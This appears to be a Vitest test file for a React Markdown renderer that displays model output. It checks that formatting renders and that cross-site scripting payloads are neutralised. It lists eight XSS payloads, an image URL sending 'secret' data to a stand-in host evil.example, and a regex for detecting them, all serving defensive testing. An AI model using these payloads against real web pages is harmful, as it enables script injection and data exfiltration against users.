import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown } from '../../components/Markdown'

const render = (text: string) => renderToStaticMarkup(<Markdown text={text} />)

describe('model output rendering', () => {
  it('renders Markdown', () => {
    const html = render('**bold** and `code`\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<li>one</li>')
    expect(html).toContain('<table>')
  })

  it.each([
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<iframe src="https://evil.example"></iframe>',
    '<a href="javascript:alert(1)">x</a>',
    '[click](javascript:alert(1))',
    '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '<svg onload=alert(1)>',
    '<div style="background:url(javascript:alert(1))">x</div>',
  ])('neutralises %s', (attack) => {
    const html = render(attack)
    expect(html).not.toMatch(/<script|<iframe|<svg|onerror|onload|javascript:|data:text/i)
    expect(html).not.toMatch(/style=/)
  })

  it('never loads images, which could carry data out', () => {
    expect(render('![x](https://evil.example/p.png?d=secret)')).not.toContain('<img')
  })

  it('opens links in a new tab without referrer or opener', () => {
    expect(render('[site](https://example.com)')).toContain('rel="noopener noreferrer nofollow ugc"')
  })
})
